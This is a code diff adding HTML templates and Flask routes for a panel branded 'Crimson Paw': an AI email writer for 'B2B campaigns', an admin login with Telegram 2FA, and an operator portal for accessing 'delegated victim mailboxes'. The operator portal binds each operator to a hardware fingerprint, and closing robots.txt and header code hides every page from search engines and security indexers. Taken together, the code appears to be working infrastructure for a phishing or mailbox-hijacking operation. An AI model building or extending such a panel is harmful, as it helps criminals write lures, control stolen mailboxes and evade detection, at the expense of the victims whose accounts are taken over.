+            const genBtn = document.getElementById('ai-gen-btn');
+            const insertBtn = document.getElementById('ai-insert-btn');
+            const preview = document.getElementById('ai-preview');
+            const status = document.getElementById('ai-gen-status');
+
+            genBtn.disabled = true;
+            genBtn.innerHTML = '<div class="ai-spinner"></div> Generating...';
+            insertBtn.disabled = true;
+            preview.textContent = '';
+            preview.classList.add('generating');
+            status.textContent = 'writing…';
+            _aiGeneratedHtml = '';
+
+            const payload = {
+                instruction,
+                tone: document.getElementById('ai-tone').value,
+                length: document.getElementById('ai-length').value,
+                sender: document.getElementById('ai-sender').value,
+                format: document.getElementById('ai-format').value,
+                campaign_name: document.getElementById('b2b-campaign-name').value || ''
+            };
+
+            // Inject cursor
+            const cursor = document.createElement('span');
+            cursor.className = 'ai-cursor';
+            preview.appendChild(cursor);
+
+            try {
+                const resp = await fetch('/api/b2b/ai_write', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+
+                const reader = resp.body.getReader();
+                const dec = new TextDecoder();
+                let buf = '';
+                let charCount = 0;
+
+                while (true) {
+                    const {done, value} = await reader.read();
+                    if (done) break;
+                    buf += dec.decode(value, {stream: true});
+                    const lines = buf.split('\n'); buf = lines.pop();
+                    for (const ln of lines) {
+                        if (!ln.startsWith('data: ')) continue;
+                        try {
+                            const d = JSON.parse(ln.slice(6));
+                            if (d.chunk) {
+                                _aiGeneratedHtml += d.chunk;
+                                charCount += d.chunk.length;
+                                // Show raw for HTML, rendered for text
+                                preview.textContent = _aiGeneratedHtml;
+                                preview.appendChild(cursor);
+                                preview.scrollTop = preview.scrollHeight;
+                                status.textContent = `${charCount} chars…`;
+                            } else if (d.done) {
+                                status.textContent = `✓ ${charCount} chars`;
+                            } else if (d.error) {
+                                preview.textContent = '❌ Error: ' + d.error;
+                                status.textContent = '';
+                            }
+                        } catch {}
+                    }
+                }
+            } catch(ex) {
+                preview.textContent = '❌ Failed: ' + ex;
+                status.textContent = '';
+            }
+
+            cursor.remove();
+            preview.classList.remove('generating');
+            genBtn.disabled = false;
+            genBtn.innerHTML = '✨ Re-generate';
+            insertBtn.disabled = !_aiGeneratedHtml;
+        }
+
+        function insertAIOutput() {
+            if (!_aiGeneratedHtml) return;
+            const fmt = document.getElementById('ai-format').value;
+            const editor = document.getElementById('b2b-editor');
+            if (fmt === 'text') {
+                // Insert as plain text, preserve line breaks
+                editor.innerHTML = _aiGeneratedHtml.split('\n').map(l => `<p>${l||'&nbsp;'}</p>`).join('');
+            } else {
+                // Insert as HTML directly
+                editor.innerHTML = _aiGeneratedHtml;
+            }
+            closeAIWriter();
+            // Switch to edit tab to confirm
+            switchB2BTab('edit');
+            showToast('AI content inserted into editor ✓');
+        }
+
+        // On page refresh or closing the tab, terminate operator session so re-authentication is required
+        window.addEventListener('beforeunload', function() {
+            navigator.sendBeacon('/api/auth/logout');
+        });
+    </script>
+</body>
+</html>
+'''
+
+CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRIMSON PAW — Administrator Access</title>
+    <link rel="icon" type="image/png" href="/static/img/crimson_paw_logo.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
+        body {
+            background-color: #0a0709;
+            background-image: 
+                radial-gradient(ellipse at 50% 0%, rgba(229, 9, 20, 0.16) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 100%, rgba(56, 22, 27, 0.28) 0%, transparent 60%);
+            color: #f0ebed;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .login-card {
+            background: #140d10;
+            border: 1px solid #38161b;
+            border-radius: 14px;
+            width: 100%;
+            max-width: 440px;
+            padding: 38px 32px;
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 30px rgba(229, 9, 20, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+        .login-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #e50914, #ff6b72, #e50914);
+        }
+        .brand-header {
+            text-align: center;
+            margin-bottom: 26px;
+        }
+        .brand-logo {
+            width: 56px;
+            height: 56px;
+            border-radius: 12px;
+            border: 1px solid rgba(229, 9, 20, 0.4);
+            box-shadow: 0 0 20px rgba(229, 9, 20, 0.4);
+            margin-bottom: 12px;
+        }
+        .brand-title {
+            font-size: 1.35rem;
+            font-weight: 900;
+            letter-spacing: 0.14em;
+            color: #ffffff;
+            text-transform: uppercase;
+        }
+        .brand-subtitle {
+            font-size: 0.72rem;
+            font-weight: 700;
+            letter-spacing: 0.2em;
+            color: #ff6b72;
+            text-transform: uppercase;
+            margin-top: 4px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .form-label {
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: #a49498;
+        }
+        .form-input {
+            width: 100%;
+            background: #0c0709;
+            border: 1px solid #38161b;
+            border-radius: 8px;
+            color: #ffffff;
+            padding: 12px 14px;
+            font-size: 0.92rem;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+        .form-input:focus {
+            border-color: #e50914;
+            box-shadow: 0 0 0 2px rgba(229, 9, 20, 0.25);
+            background: #11090d;
+        }
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(135deg, #e50914, #b00710);
+            color: #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            padding: 13px 18px;
+            font-size: 0.88rem;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 8px;
+            box-shadow: 0 4px 18px rgba(229, 9, 20, 0.35);
+        }
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 22px rgba(229, 9, 20, 0.55);
+            background: linear-gradient(135deg, #ff1a25, #c70813);
+        }
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .alert-box {
+            background: rgba(229, 9, 20, 0.12);
+            border: 1px solid rgba(229, 9, 20, 0.4);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 0.78rem;
+            color: #ff858c;
+            margin-bottom: 18px;
+            display: none;
+            line-height: 1.4;
+        }
+        .alert-box.locked {
+            background: rgba(229, 9, 20, 0.25);
+            border: 2px solid #e50914;
+            color: #ffffff;
+            font-weight: 600;
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 0.68rem;
+            color: #705f63;
+            margin-top: 22px;
+            letter-spacing: 0.04em;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="brand-header">
+            <img src="/static/img/crimson_paw_logo.png" alt="Crimson Paw" class="brand-logo">
+            <div class="brand-title">CRIMSON PAW</div>
+            <div class="brand-subtitle">Administrator Console</div>
+        </div>
+
+        <div id="login-alert" class="alert-box"></div>
+
+        <!-- Admin Form Step 1: Identifier & Password -->
+        <form id="admin-login-form" onsubmit="handleAdminLogin(event)">
+            <div class="form-group">
+                <label class="form-label" for="username">Administrator Identifier</label>
+                <input type="text" id="username" class="form-input" placeholder="admin" autocomplete="username" required autofocus>
+            </div>
+            <div class="form-group">
+                <label class="form-label" for="password">Password</label>
+                <input type="password" id="password" class="form-input" placeholder="••••••••••••" autocomplete="current-password" required>
+            </div>
+            <button type="submit" id="btn-admin-login" class="btn-submit">Sign In ❯</button>
+        </form>
+
+        <!-- Admin Form Step 2: Telegram 2FA Code -->
+        <div id="admin-2fa-step" style="display:none;">
+            <div style="background:#1b0f14; border:1px solid #4a1920; border-radius:8px; padding:12px; margin-bottom:16px; text-align:center;">
+                <div style="font-size:1.5rem; margin-bottom:4px;">🤖</div>
+                <div style="font-size:0.82rem; font-weight:700; color:#ffffff;">Telegram 2FA Security Code</div>
+                <div style="font-size:0.74rem; color:#b09ba2; margin-top:4px;">A 6-digit code has been dispatched to your alert bot.</div>
+            </div>
+            <div class="form-group">
+                <label class="form-label" for="twofa-code">Enter 6-Digit Code</label>
+                <input type="text" id="twofa-code" class="form-input" placeholder="••••••" maxlength="6" autocomplete="one-time-code" style="text-align:center; font-size:1.6rem; letter-spacing:0.35em; font-family:monospace; font-weight:800;">
+            </div>
+            <button type="button" id="btn-verify-2fa" class="btn-submit" onclick="handleVerify2FA()">Verify &amp; Enter Console ❯</button>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-top:14px; font-size:0.75rem;">
+                <span id="twofa-timer" style="color:#a49498;">⏱️ Expires in 05:00</span>
+                <a href="javascript:void(0)" onclick="resend2FACode()" style="color:#ff6b72; text-decoration:none; font-weight:600;">Resend Code</a>
+            </div>
+            <div style="text-align:center; margin-top:12px;">
+                <a href="javascript:void(0)" onclick="resetAdminLoginStep()" style="color:#705f63; font-size:0.72rem; text-decoration:none;">← Back to password</a>
+            </div>
+        </div>
+
+        <div class="footer-note">CRIMSON PAW RED TEAM CONSOLE • RESTRICTED ACCESS</div>
+    </div>
+
+    <script>
+        let twoFaExpiryTimer = null;
+        let twoFaRemainingSec = 300;
+
+        function resetAdminLoginStep() {
+            clearInterval(twoFaExpiryTimer);
+            document.getElementById('admin-login-form').style.display = 'block';
+            document.getElementById('admin-2fa-step').style.display = 'none';
+            document.getElementById('login-alert').style.display = 'none';
+            document.getElementById('password').focus();
+        }
+
+        function showAlert(msg, isLocked = false) {
+            const el = document.getElementById('login-alert');
+            el.innerText = msg;
+            el.classList.toggle('locked', isLocked);
+            el.style.display = 'block';
+        }
+
+        async function handleAdminLogin(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btn-admin-login');
+            const u = document.getElementById('username').value.trim();
+            const p = document.getElementById('password').value;
+
+            btn.disabled = true;
+            btn.innerText = 'Authenticating...';
+            document.getElementById('login-alert').style.display = 'none';
+
+            try {
+                const res = await fetch('/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: u, password: p })
+                });
+                const data = await res.json();
+                btn.disabled = false;
+                btn.innerText = 'Sign In ❯';
+
+                if (data.success) {
+                    if (data.requires_2fa) {
+                        document.getElementById('admin-login-form').style.display = 'none';
+                        document.getElementById('admin-2fa-step').style.display = 'block';
+                        document.getElementById('twofa-code').value = '';
+                        document.getElementById('twofa-code').focus();
+                        start2FATimer(300);
+                    } else {
+                        btn.innerText = 'Success ✓ Redirecting...';
+                        window.location.href = data.redirect || '/dashboard';
+                    }
+                } else {
+                    showAlert(data.error || 'Authentication rejected.', !!data.locked);
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                }
+            } catch(err) {
+                btn.disabled = false;
+                btn.innerText = 'Sign In ❯';
+                showAlert('Connection error: ' + err);
+            }
+        }
+
+        function start2FATimer(seconds) {
+            clearInterval(twoFaExpiryTimer);
+            twoFaRemainingSec = seconds;
+            updateTimerDisplay();
+            twoFaExpiryTimer = setInterval(() => {
+                twoFaRemainingSec--;
+                updateTimerDisplay();
+                if (twoFaRemainingSec <= 0) {
+                    clearInterval(twoFaExpiryTimer);
+                    showAlert('Verification code expired. Please sign in again.');
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const m = String(Math.floor(twoFaRemainingSec / 60)).padStart(2, '0');
+            const s = String(twoFaRemainingSec % 60).padStart(2, '0');
+            const el = document.getElementById('twofa-timer');
+            if (el) el.innerText = `⏱️ Expires in ${m}:${s}`;
+        }
+
+        async function handleVerify2FA() {
+            const btn = document.getElementById('btn-verify-2fa');
+            const code = document.getElementById('twofa-code').value.trim();
+            if (!code || code.length < 6) {
+                showAlert('Please enter the complete 6-digit code.');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = 'Verifying...';
+            document.getElementById('login-alert').style.display = 'none';
+
+            try {
+                const res = await fetch('/api/auth/verify-2fa', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code })
+                });
+                const data = await res.json();
+                btn.disabled = false;
+                btn.innerText = 'Verify & Enter Console ❯';
+
+                if (data.success) {
+                    clearInterval(twoFaExpiryTimer);
+                    btn.innerText = 'Access Granted ✓';
+                    window.location.href = data.redirect || '/dashboard';
+                } else {
+                    showAlert(data.error || 'Invalid code.', !!data.locked);
+                    document.getElementById('twofa-code').value = '';
+                    document.getElementById('twofa-code').focus();
+                }
+            } catch(err) {
+                btn.disabled = false;
+                btn.innerText = 'Verify & Enter Console ❯';
+                showAlert('Connection error: ' + err);
+            }
+        }
+
+        async function resend2FACode() {
+            try {
+                const res = await fetch('/api/auth/resend-2fa', { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert('A fresh verification code has been dispatched to Telegram.');
+                    start2FATimer(300);
+                } else {
+                    showAlert(data.error || 'Failed to resend code.');
+                }
+            } catch(err) {
+                showAlert('Error resending code: ' + err);
+            }
+        }
+    </script>
+</body>
+</html>
+'''
+
+# ── DEDICATED OPERATOR PORTAL GATEWAY HTML ────────────────────────────
+CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRIMSON PAW — Operator Mailbox Access</title>
+    <link rel="icon" type="image/png" href="/static/img/crimson_paw_logo.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
+        body {
+            background-color: #080608;
+            background-image: 
+                radial-gradient(ellipse at 50% 0%, rgba(88, 166, 255, 0.14) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 100%, rgba(229, 9, 20, 0.12) 0%, transparent 60%);
+            color: #f0ebed;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .portal-card {
+            background: #110c10;
+            border: 1px solid #2e1c25;
+            border-radius: 14px;
+            width: 100%;
+            max-width: 440px;
+            padding: 38px 32px;
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 30px rgba(88, 166, 255, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+        .portal-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #58a6ff, #e50914, #58a6ff);
+        }
+        .brand-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .brand-logo {
+            width: 56px;
+            height: 56px;
+            border-radius: 12px;
+            border: 1px solid rgba(88, 166, 255, 0.4);
+            box-shadow: 0 0 20px rgba(88, 166, 255, 0.25);
+            margin-bottom: 12px;
+        }
+        .brand-title {
+            font-size: 1.35rem;
+            font-weight: 900;
+            letter-spacing: 0.14em;
+            color: #ffffff;
+            text-transform: uppercase;
+        }
+        .brand-subtitle {
+            font-size: 0.72rem;
+            font-weight: 700;
+            letter-spacing: 0.16em;
+            color: #58a6ff;
+            text-transform: uppercase;
+            margin-top: 4px;
+        }
+        .portal-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #191218;
+            border: 1px solid #3d2230;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 0.72rem;
+            color: #a49498;
+            margin-top: 8px;
+            font-family: monospace;
+        }
+        .form-group {
+            margin-bottom: 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .form-label {
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: #a49498;
+        }
+        .form-input {
+            width: 100%;
+            background: #090608;
+            border: 1px solid #3d2230;
+            border-radius: 8px;
+            color: #ffffff;
+            padding: 12px 14px;
+            font-size: 0.92rem;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+        .form-input:focus {
+            border-color: #58a6ff;
+            box-shadow: 0 0 0 2px rgba(88, 166, 255, 0.25);
+            background: #0e090d;
+        }
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(135deg, #1f6feb, #1158c7);
+            color: #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            padding: 13px 18px;
+            font-size: 0.88rem;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 8px;
+            box-shadow: 0 4px 18px rgba(31, 111, 235, 0.35);
+        }
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 22px rgba(31, 111, 235, 0.55);
+            background: linear-gradient(135deg, #388bfd, #1f6feb);
+        }
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .alert-box {
+            background: rgba(229, 9, 20, 0.12);
+            border: 1px solid rgba(229, 9, 20, 0.4);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-size: 0.78rem;
+            color: #ff858c;
+            margin-bottom: 18px;
+            display: none;
+            line-height: 1.4;
+        }
+        .alert-box.info {
+            background: rgba(88, 166, 255, 0.12);
+            border-color: rgba(88, 166, 255, 0.4);
+            color: #79c0ff;
+        }
+        .footer-note {
+            text-align: center;
+            font-size: 0.68rem;
+            color: #705f63;
+            margin-top: 22px;
+            letter-spacing: 0.04em;
+        }
+    </style>
+</head>
+<body>
+    <div class="portal-card">
+        <div class="brand-header">
+            <img src="/static/img/crimson_paw_logo.png" alt="Crimson Paw" class="brand-logo">
+            <div class="brand-title">CRIMSON PAW</div>
+            <div class="brand-subtitle">Operator Access Gateway</div>
+            <div class="portal-badge">PORTAL: /m/{{ token }}</div>
+        </div>
+
+        <div id="op-alert" class="alert-box"></div>
+
+        <!-- Step 1: Access Key Entry -->
+        <form id="step-key" onsubmit="submitAccessKey(event)">
+            <div class="form-group">
+                <label class="form-label" for="op-key">Operator Access Key</label>
+                <input type="password" id="op-key" class="form-input" placeholder="••••••••••••" autocomplete="current-password" required autofocus>
+                <div style="font-size:0.72rem; color:#705f63; margin-top:4px;">
+                    Enter the access key generated for this operator account (e.g. CP-XXXX-XXXX).
+                </div>
+            </div>
+            <button type="submit" id="btn-key" class="btn-submit">Verify Access Key ❯</button>
+        </form>
+
+        <!-- Step 2: First-Time Telegram 2FA Setup -->
+        <div id="step-setup-2fa" style="display:none;">
+            <div style="background:rgba(88,166,255,0.08); border:1px solid rgba(88,166,255,0.25); border-radius:8px; padding:12px; margin-bottom:16px;">
+                <div style="font-size:0.84rem; font-weight:800; color:#58a6ff; margin-bottom:4px;">🤖 First-Time 2FA Setup Required</div>
+                <div style="font-size:0.74rem; color:#c9d1d9; line-height:1.4;">
+                    To protect delegated victim mailboxes, connect your personal Telegram bot to receive login verification codes.
+                </div>
+            </div>
+            <form id="form-setup-2fa" onsubmit="submitTelegramSetup(event)">
+                <div class="form-group">
+                    <label class="form-label" for="setup-bot-token">Telegram Bot Token</label>
+                    <input type="password" id="setup-bot-token" class="form-input" placeholder="e.g. 7123456789:AAH..." style="font-family:monospace; font-size:0.84rem;" required>
+                    <div style="font-size:0.7rem; color:#705f63; margin-top:2px;">From @BotFather on Telegram.</div>
+                </div>
+                <div class="form-group">
+                    <label class="form-label" for="setup-chat-id">Telegram Chat ID</label>
+                    <input type="text" id="setup-chat-id" class="form-input" placeholder="e.g. 123456789" style="font-family:monospace; font-size:0.84rem;" required>
+                    <div style="font-size:0.7rem; color:#705f63; margin-top:2px;">Your personal Chat ID from @userinfobot.</div>
+                </div>
+                <button type="submit" id="btn-setup-2fa" class="btn-submit">Connect Bot &amp; Send 2FA Code ❯</button>
+            </form>
+        </div>
+
+        <!-- Step 3: Enter Telegram 2FA OTP -->
+        <div id="step-verify-2fa" style="display:none;">
+            <div style="background:#131118; border:1px solid #2e263d; border-radius:8px; padding:12px; margin-bottom:16px; text-align:center;">
+                <div style="font-size:1.6rem; margin-bottom:4px;">🛡️</div>
+                <div style="font-size:0.84rem; font-weight:800; color:#ffffff;">Telegram 2FA Verification</div>
+                <div style="font-size:0.74rem; color:#a49498; margin-top:4px;">A single-use 6-digit code has been dispatched to your Telegram bot.</div>
+            </div>
+            <div class="form-group">
+                <label class="form-label" for="op-2fa-code">Enter 6-Digit Code</label>
+                <input type="text" id="op-2fa-code" class="form-input" placeholder="••••••" maxlength="6" autocomplete="one-time-code" style="text-align:center; font-size:1.6rem; letter-spacing:0.35em; font-family:monospace; font-weight:800;" autofocus>
+            </div>
+            <button type="button" id="btn-verify-2fa" class="btn-submit" onclick="submitVerify2FA()">Authenticate &amp; Enter Mailbox ❯</button>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-top:14px; font-size:0.75rem;">
+                <span id="op-timer" style="color:#a49498;">⏱️ Expires in 05:00</span>
+                <a href="javascript:void(0)" onclick="resendOpCode()" style="color:#58a6ff; text-decoration:none; font-weight:600;">Resend Code</a>
+            </div>
+            <div style="text-align:center; margin-top:12px;">
+                <a href="javascript:void(0)" onclick="resetPortalStep()" style="color:#705f63; font-size:0.72rem; text-decoration:none;">← Back to Access Key</a>
+            </div>
+        </div>
+
+        <div class="footer-note">CRIMSON PAW • RESTRICTED OPERATOR CONSOLE</div>
+    </div>
+
+    <script>
+        const portalToken = "{{ token }}";
+        let opExpiryTimer = null;
+        let opRemainingSec = 300;
+
+        async function getDeviceFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('CRIMSON_PAW_HW_SIG', 2, 2);
+                const canvasData = canvas.toDataURL();
+                
+                let webglStr = '';
+                try {
+                    const gl = document.createElement('canvas').getContext('webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            webglStr = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '';
+                        }
+                    }
+                } catch(e) {}
+
+                const rawSig = [
+                    navigator.userAgent,
+                    navigator.platform,
+                    navigator.hardwareConcurrency || '0',
+                    screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
+                    canvasData.slice(0, 80),
+                    webglStr
+                ].join('###');
+
+                const encoder = new TextEncoder();
+                const data = encoder.encode(rawSig);
+                const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+                const hashArray = Array.from(new Uint8Array(hashBuffer));
+                const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+                
+                const ua = navigator.userAgent;
+                let os = 'Workstation';
+                if (ua.includes('Win')) os = 'Windows';
+                else if (ua.includes('Mac')) os = 'macOS';
+                else if (ua.includes('Linux')) os = 'Linux';
+                else if (ua.includes('Android')) os = 'Android';
+                else if (ua.includes('iPhone')) os = 'iOS';
+
+                let br = 'Browser';
+                if (ua.includes('Edg/')) br = 'Edge';
+                else if (ua.includes('Chrome/')) br = 'Chrome';
+                else if (ua.includes('Firefox/')) br = 'Firefox';
+                else if (ua.includes('Safari/')) br = 'Safari';
+
+                return {
+                    hash: hashHex,
+                    info: `${os} • ${br} (${screen.width}x${screen.height})`
+                };
+            } catch (err) {
+                return { hash: 'sig_' + (navigator.userAgent.length), info: 'Standard Workstation' };
+            }
+        }
+
+        function showAlert(msg, isInfo = false) {
+            const el = document.getElementById('op-alert');
+            el.innerText = msg;
+            el.className = 'alert-box' + (isInfo ? ' info' : '');
+            el.style.display = 'block';
+        }
+
+        function resetPortalStep() {
+            clearInterval(opExpiryTimer);
+            document.getElementById('step-key').style.display = 'block';
+            document.getElementById('step-setup-2fa').style.display = 'none';
+            document.getElementById('step-verify-2fa').style.display = 'none';
+            document.getElementById('op-alert').style.display = 'none';
+            document.getElementById('op-key').focus();
+        }
+
+        async function submitAccessKey(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btn-key');
+            const key = document.getElementById('op-key').value.trim();
+            btn.disabled = true;
+            btn.innerText = 'Verifying Hardware & Key...';
+            document.getElementById('op-alert').style.display = 'none';
+
+            try {
+                const fp = await getDeviceFingerprint();
+                const res = await fetch(`/api/m/${portalToken}/auth`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ access_key: key, device_hash: fp.hash, device_info: fp.info })
+                });
+                const data = await res.json();
+                btn.disabled = false;
+                btn.innerText = 'Verify Access Key ❯';
+
+                if (data.success) {
+                    if (data.needs_setup_2fa) {
+                        document.getElementById('step-key').style.display = 'none';
+                        document.getElementById('step-setup-2fa').style.display = 'block';
+                        document.getElementById('setup-bot-token').focus();
+                    } else if (data.requires_2fa) {
+                        document.getElementById('step-key').style.display = 'none';
+                        document.getElementById('step-verify-2fa').style.display = 'block';
+                        document.getElementById('op-2fa-code').value = '';
+                        document.getElementById('op-2fa-code').focus();
+                        startOpTimer(300);
+                    } else if (data.redirect) {
+                        window.location.href = data.redirect;
+                    }
+                } else {
+                    if (data.hardware_mismatch) {
+                        showAlert('🚫 ACCESS DENIED: Hardware Device Mismatch.\nThis operator account is permanently locked to another provisioned workstation. Account sharing is strictly prohibited.\nContact Master Admin to reset your hardware lock.');
+                    } else {
+                        showAlert(data.error || 'Invalid Access Key.');
+                    }
+                    document.getElementById('op-key').value = '';
+                    document.getElementById('op-key').focus();
+                }
+            } catch (err) {
+                btn.disabled = false;
+                btn.innerText = 'Verify Access Key ❯';
+                showAlert('Connection error: ' + err);
+            }
+        }
+
+        async function submitTelegramSetup(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btn-setup-2fa');
+            const botToken = document.getElementById('setup-bot-token').value.trim();
+            const chatId = document.getElementById('setup-chat-id').value.trim();
+            btn.disabled = true;
+            btn.innerText = 'Connecting Bot...';
+            document.getElementById('op-alert').style.display = 'none';
+
+            try {
+                const res = await fetch(`/api/m/${portalToken}/setup-2fa`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ tg_bot_token: botToken, tg_chat_id: chatId })
+                });
+                const data = await res.json();
+                btn.disabled = false;
+                btn.innerText = 'Connect Bot & Send 2FA Code ❯';
+
+                if (data.success) {
+                    document.getElementById('step-setup-2fa').style.display = 'none';
+                    document.getElementById('step-verify-2fa').style.display = 'block';
+                    document.getElementById('op-2fa-code').value = '';
+                    document.getElementById('op-2fa-code').focus();
+                    startOpTimer(300);
+                    showAlert('Telegram bot connected! 6-digit code sent to your chat.', true);
+                } else {
+                    showAlert(data.error || 'Failed to connect Telegram bot.');
+                }
+            } catch (err) {
+                btn.disabled = false;
+                btn.innerText = 'Connect Bot & Send 2FA Code ❯';
+                showAlert('Connection error: ' + err);
+            }
+        }
+
+        function startOpTimer(sec) {
+            clearInterval(opExpiryTimer);
+            opRemainingSec = sec;
+            updateOpTimerDisplay();
+            opExpiryTimer = setInterval(() => {
+                opRemainingSec--;
+                updateOpTimerDisplay();
+                if (opRemainingSec <= 0) {
+                    clearInterval(opExpiryTimer);
+                    showAlert('Code expired. Click "Resend Code" to get a fresh code.');
+                }
+            }, 1000);
+        }
+
+        function updateOpTimerDisplay() {
+            const m = String(Math.floor(opRemainingSec / 60)).padStart(2, '0');
+            const s = String(opRemainingSec % 60).padStart(2, '0');
+            const el = document.getElementById('op-timer');
+            if (el) el.innerText = `⏱️ Expires in ${m}:${s}`;
+        }
+
+        async function submitVerify2FA() {
+            const btn = document.getElementById('btn-verify-2fa');
+            const code = document.getElementById('op-2fa-code').value.trim();
+            if (!code || code.length < 6) {
+                showAlert('Please enter the complete 6-digit code.');
+                return;
+            }
+            btn.disabled = true;
+            btn.innerText = 'Binding Hardware & Authenticating...';
+            document.getElementById('op-alert').style.display = 'none';
+
+            try {
+                const fp = await getDeviceFingerprint();
+                const res = await fetch(`/api/m/${portalToken}/verify-2fa`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code: code, device_hash: fp.hash, device_info: fp.info })
+                });
+                const data = await res.json();
+                btn.disabled = false;
+                btn.innerText = 'Authenticate & Enter Mailbox ❯';
+
+                if (data.success) {
+                    btn.innerText = 'Workstation Bound ✓ Access Granted';
+                    window.location.href = `/m/${portalToken}`;
+                } else {
+                    showAlert(data.error || 'Invalid code.');
+                    document.getElementById('op-2fa-code').value = '';
+                    document.getElementById('op-2fa-code').focus();
+                }
+            } catch (err) {
+                btn.disabled = false;
+                btn.innerText = 'Authenticate & Enter Mailbox ❯';
+                showAlert('Connection error: ' + err);
+            }
+        }
+
+        async function resendOpCode() {
+            try {
+                const res = await fetch(`/api/m/${portalToken}/resend-2fa`, { method: 'POST' });
+                const data = await res.json();
+                if (data.success) {
+                    showAlert('A fresh 2FA code has been sent to your Telegram bot.', true);
+                    startOpTimer(300);
+                } else {
+                    showAlert(data.error || 'Failed to resend code.');
+                }
+            } catch (err) {
+                showAlert('Error resending: ' + err);
+            }
+        }
+    </script>
+</body>
+</html>
+'''
+
+@app.route('/robots.txt')
+def serve_robots_txt():
+    """Instruct search engine crawlers and security indexers not to index or cache any platform pages."""
+    resp = Response("User-agent: *\nDisallow: /\n", mimetype="text/plain")
+    resp.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive, nosnippet"
+    return resp
+
+@app.after_request
+def add_anti_crawler_headers(response):
+    """Enforce noindex, nofollow, and noarchive headers globally across all HTTP responses."""
